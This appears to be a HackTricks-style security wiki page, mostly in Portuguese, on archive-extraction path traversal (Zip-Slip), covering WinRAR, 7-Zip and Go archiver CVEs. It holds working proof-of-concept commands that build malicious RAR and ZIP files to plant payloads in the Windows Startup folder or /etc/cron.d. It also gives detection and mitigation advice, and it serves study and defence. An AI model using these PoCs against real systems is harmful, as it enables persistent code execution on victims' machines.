# Archive Extraction Path Traversal ("Zip-Slip" / WinRAR CVE-2025-8088)

{{#include ../banners/hacktricks-training.md}}

## Visão Geral

Muitos formatos de arquivo compactado (ZIP, RAR, TAR, 7-ZIP, etc.) permitem que cada entrada carregue seu próprio **internal path**. Quando uma ferramenta de extração aceita cegamente esse caminho, um nome de arquivo forjado contendo `..` ou um **absolute path** (por exemplo `C:\Windows\System32\`) será gravado fora do diretório escolhido pelo usuário.
Essa classe de vulnerabilidade é amplamente conhecida como *Zip-Slip* ou **archive extraction path traversal**.

As consequências vão desde sobrescrever arquivos arbitrários até alcançar diretamente **remote code execution (RCE)** ao deixar um payload em um local de **auto-run** como a pasta *Startup* do Windows.

## Causa Raiz

1. O atacante cria um arquivo onde um ou mais cabeçalhos de arquivo contêm:
* Sequências de travessia relativas (`..\..\..\Users\\victim\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\payload.exe`)
* Caminhos absolutos (`C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\payload.exe`)
* Ou **symlinks** forjados que resolvem para fora do diretório de destino (comum em ZIP/TAR em *nix*).
2. A vítima extrai o arquivo com uma ferramenta vulnerável que confia no caminho embutido (ou segue symlinks) em vez de sanitizá-lo ou forçar a extração sob o diretório escolhido.
3. O arquivo é gravado no local controlado pelo atacante e executado/carregado na próxima vez que o sistema ou o usuário acionar esse caminho.

### .NET `Path.Combine` + `ZipArchive` traversal

Um anti-padrão comum em .NET é combinar o destino pretendido com **controlado pelo usuário** `ZipArchiveEntry.FullName` e extrair sem normalização do caminho:
```csharp
using (var zip = ZipFile.OpenRead(zipPath))
{
foreach (var entry in zip.Entries)
{
var dest = Path.Combine(@"C:\samples\queue\", entry.FullName); // drops base if FullName is absolute
entry.ExtractToFile(dest);
}
}
```
- Se `entry.FullName` começa com `..\\` ocorre traversal; se for um **absolute path** o componente à esquerda é descartado inteiramente, resultando em um **arbitrary file write** como a identidade de extração.
- Arquivo de prova de conceito para gravar em um diretório irmão `app` monitorado por um scanner agendado:
```python
import zipfile
with zipfile.ZipFile("slip.zip", "w") as z:
z.writestr("../app/0xdf.txt", "ABCD")
```
Soltar esse ZIP na caixa de entrada monitorada resulta em `C:\samples\app\0xdf.txt`, provando a travessia para fora de `C:\samples\queue\` e permitindo follow-on primitives (por exemplo, DLL hijacks).

## Exemplo do mundo real – WinRAR ≤ 7.12 (CVE-2025-8088)

WinRAR para Windows (incluindo o `rar` / `unrar` CLI, a DLL e o código-fonte portátil) não validava os nomes de arquivo durante a extração.
Um arquivo RAR malicioso contendo uma entrada como:
```text
..\..\..\Users\victim\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\payload.exe
```
acabaria **fora** do diretório de saída selecionado e dentro da pasta *Startup* do usuário. Após o logon, o Windows executa automaticamente tudo presente ali, fornecendo RCE *persistente*.

### Criando um arquivo PoC (Linux/Mac)
```bash
# Requires rar >= 6.x
mkdir -p "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
cp payload.exe "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/"
rar a -ep evil.rar evil/*
```
Opções usadas:
* `-ep`  – store file paths exactly as given (do **not** prune leading `./`).

Entregue `evil.rar` à vítima e instrua-a a extrair com uma build vulnerável do WinRAR.

### Exploração Observada no Mundo Real

ESET reportou campanhas de spear-phishing do RomCom (Storm-0978/UNC2596) que anexavam arquivos RAR explorando CVE-2025-8088 para implantar backdoors personalizados e facilitar operações de ransomware.

## Casos Mais Recentes (2024–2025)

### 7-Zip ZIP symlink traversal → RCE (CVE-2025-11001 / ZDI-25-949)
* **Bug**: ZIP entries that are **symbolic links** were dereferenced during extraction, letting attackers escape the destination directory and overwrite arbitrary paths. User interaction is just *opening/extracting* the archive.
* **Affected**: 7-Zip 21.02–24.09 (Windows & Linux builds). Fixed in **25.00** (July 2025) and later.
* **Impact path**: Overwrite `Start Menu/Programs/Startup` or service-run locations → code runs at next logon or service restart.
* **Quick PoC (Linux)**:
```bash
mkdir -p out
ln -s /etc/cron.d evil
zip -y exploit.zip evil   # -y preserves symlinks
7z x exploit.zip -o/tmp/target   # vulnerable 7-Zip writes to /etc/cron.d
```
On a patched build `/etc/cron.d` won’t be touched; the symlink is extracted as a link inside /tmp/target.

### Go mholt/archiver Unarchive() Zip-Slip (CVE-2025-3445)
* **Bug**: `archiver.Unarchive()` follows `../` and symlinked ZIP entries, writing outside `outputDir`.
* **Affected**: `github.com/mholt/archiver` ≤ 3.5.1 (project now deprecated).
* **Fix**: Switch to `mholt/archives` ≥ 0.1.0 or implement canonical-path checks before write.
* **Minimal reproduction**:
```go
// go test . with archiver<=3.5.1
archiver.Unarchive("exploit.zip", "/tmp/safe")
// exploit.zip holds ../../../../home/user/.ssh/authorized_keys
```

## Dicas de Detecção

* **Inspeção estática** – Liste entradas do arquivo e sinalize qualquer nome que contenha `../`, `..\\`, *caminhos absolutos* (`/`, `C:`) ou entradas do tipo *symlink* cujo alvo esteja fora do diretório de extração.
* **Canonização** – Garanta que `realpath(join(dest, name))` ainda começa com `dest`. Rejeite caso contrário.
* **Extração em sandbox** – Descomprima em um diretório descartável usando um extractor *seguro* (por exemplo, `bsdtar --safe --xattrs --no-same-owner`, 7-Zip ≥ 25.00) e verifique se os caminhos resultantes permanecem dentro do diretório.
* **Monitoramento de endpoint** – Gere alerta para novos executáveis gravados em locais `Startup`/`Run`/`cron` logo após um arquivo ser aberto por WinRAR/7-Zip/etc.

## Mitigações e Endurecimento

1. **Atualize o extractor** – WinRAR 7.13+ e 7-Zip 25.00+ implementam sanitização de caminhos/symlinks. Ambos ainda carecem de auto-update.
2. Extraia arquivos com “**Do not extract paths**” / “**Ignore paths**” quando possível.
3. No Unix, reduza privilégios e monte um **chroot/namespace** antes da extração; no Windows, use **AppContainer** ou uma sandbox.
4. Se escrever código customizado, normalize com `realpath()`/`PathCanonicalize()` **antes** de criar/escrever, e rejeite qualquer entrada que escape o destino.

## Casos Adicionais Afetados / Históricos

* 2018 – Grande advisory *Zip-Slip* pela Snyk afetando muitas bibliotecas Java/Go/JS.
* 2023 – 7-Zip CVE-2023-4011 travessia similar durante `-ao` merge.
* 2025 – HashiCorp `go-slug` (CVE-2025-0377) TAR extraction traversal in slugs (patch in v1.2).
* Qualquer lógica de extração customizada que não chame `PathCanonicalize` / `realpath` antes de escrever.

## References

- [Trend Micro ZDI-25-949 – 7-Zip symlink ZIP traversal (CVE-2025-11001)](https://www.zerodayinitiative.com/advisories/ZDI-25-949/)
- [JFrog Research – mholt/archiver Zip-Slip (CVE-2025-3445)](https://research.jfrog.com/vulnerabilities/archiver-zip-slip/)
- [Meziantou – Prevent Zip Slip in .NET](https://www.meziantou.net/prevent-zip-slip-in-dotnet.htm)
- [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)

{{#include ../banners/hacktricks-training.md}}
